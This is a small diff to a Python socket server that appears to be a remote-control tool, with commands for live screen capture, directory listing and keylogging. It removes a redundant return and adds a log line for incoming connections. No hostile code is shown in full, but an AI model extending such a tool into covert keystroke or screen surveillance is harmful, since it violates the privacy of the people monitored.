@@ -41,7 +41,6 @@ def live_screen():
     global client
     lss.capture_screen(client)
     return
-    return
 
 def directory_tree():
     global client 
@@ -64,6 +63,7 @@ def Connect():
     s.listen(100)
     global client
     client, addr = s.accept()
+    print("Connect from ", addr)
     while True:
         msg = client.recv(BUFSIZ).decode("utf8")
         if "KEYLOG" in msg:
